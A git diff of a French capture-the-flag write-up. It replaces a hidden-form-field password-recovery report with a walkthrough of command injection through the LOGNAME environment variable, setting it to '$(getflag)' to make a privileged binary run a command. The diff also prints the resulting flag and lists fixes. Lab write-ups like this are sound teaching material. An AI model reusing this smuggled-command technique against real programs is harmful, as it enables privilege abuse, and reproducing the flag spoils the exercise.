@@ -1,39 +1,87 @@
-# Rapport de Vulnérabilité : Faille de Récupération de Mot de Passe
-
-## Nom de la Faille
-**Faible Contrôle des Champs Cachés dans le Formulaire de Récupération de Mot de Passe**
-## OWASP
-**A07:2021 – Identification et authentification de mauvaise qualité**
+# Rapport de Vulnérabilité : Injection de commande via la variable d’environnement `LOGNAME`
 
 ## Description
-Cette faille permet à un attaquant de manipuler le formulaire de récupération de mot de passe en modifiant ou supprimant un champ `hidden` contenant une adresse e-mail pré-remplie. En supprimant ce champ et en soumettant le formulaire, l'attaquant obtient directement un accès à des informations sensibles, comme un flag.
+
+Dans ce niveau, un binaire appartenant à `flag07` affiche le contenu de la variable d’environnement `LOGNAME` sans vérification. En manipulant cette variable pour inclure une **commande shell**, il est possible de forcer le programme à exécuter une commande système, comme `getflag`, et d’obtenir ainsi le flag.
 
 ## Comment Exploiter la Faille
-1. **Étape 1** : Accédez à la page de récupération de mot de passe et ouvrez les outils de développement du navigateur (`F12` ou `Clic droit > Inspecter`).
-2. **Étape 2** : Repérez le formulaire suivant dans le code HTML :
-   ```html
-   <form action="#" method="POST">
-       <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
-       <input type="submit" name="Submit" value="Submit">
-   </form>
-   ```
-3. **Étape 3** : Modifiez le code en supprimant la ligne contenant l'input `hidden` :
-   ```html
-   <form action="#" method="POST">
-       <input type="submit" name="Submit" value="Submit">
-   </form>
-   ```
-4. **Étape 4** : Soumettez le formulaire modifié.
-5. **Étape 5** : Si la vérification du champ `mail` est mal implémentée côté serveur, le flag s'affiche sur la page.
+
+### Étape 1 : Observation du comportement du binaire
+
+Exécution simple :
+
+```bash
+./level07
+```
+
+**Résultat :**
+
+```
+level07
+```
+
+Cela indique que le programme utilise probablement la variable `LOGNAME`.
+
+### Étape 2 : Modifier la variable d’environnement `LOGNAME`
+
+Définir manuellement la variable :
+
+```bash
+export LOGNAME=ouioui
+./level07
+```
+
+**Résultat :**
+
+```
+ouioui
+```
+
+Cela confirme que le programme affiche directement la valeur de `LOGNAME`.
+
+### Étape 3 : Injecter une commande dans la variable
+
+On remplace la valeur de `LOGNAME` par une commande shell :
+
+```bash
+export LOGNAME='$(getflag)'
+./level07
+```
+
+**Résultat :**
+
+```
+fiumuikeil55xe9cu4dood66h
+```
+
+La commande `getflag` a bien été exécutée.
+
+### Étape 4 : Confirmation via reverse engineering
+
+Avec `objdump`, on vérifie que le binaire appelle `getenv`, ce qui confirme qu’il récupère la variable d’environnement `LOGNAME` :
+
+```bash
+objdump -d -M intel level07
+```
+
+Extrait :
+
+```
+call   8048400 <getenv@plt>
+```
+
+---
 
 ## Comment Résoudre la Faille
-Pour corriger cette vulnérabilité, appliquez les bonnes pratiques suivantes :
 
-- **Ne pas faire confiance aux champs cachés** : Un champ `hidden` peut être facilement modifié par un utilisateur.
-- **Vérification stricte côté serveur** : Assurez-vous que la requête inclut bien un e-mail valide enregistré dans la base de données.
-- **Utiliser des jetons sécurisés** : Remplacez l'identification par e-mail par un jeton unique envoyé par e-mail à l'utilisateur.
-- **Implémenter un contrôle d'authentification** : Exiger une authentification préalable avant d'afficher un formulaire de récupération de mot de passe.
+Pour corriger cette vulnérabilité :
+
+* **Ne jamais exécuter de chaînes provenant d’une variable d’environnement sans les filtrer**.
+* **Utiliser des appels sûrs** : Ne pas passer de variables shell dans des fonctions comme `system()` ou via des backticks.
+* **Désactiver les expansions de commandes** : Si une variable est destinée à être affichée, la traiter comme une simple chaîne.
 
 ## Conclusion
-Cette vulnérabilité démontre les risques liés à une validation insuffisante des entrées utilisateur. En mettant en place des contrôles stricts côté serveur et en évitant d'exposer des données sensibles dans des champs cachés, vous pouvez sécuriser efficacement votre application contre ce type d'attaque.
 
+Ce niveau démontre les risques liés à l’utilisation non sécurisée des variables d’environnement. En permettant à l’utilisateur de manipuler `LOGNAME`, le binaire devient vulnérable à une **injection de commande**, pouvant être exploitée pour obtenir des privilèges ou des informations sensibles.
+
+---
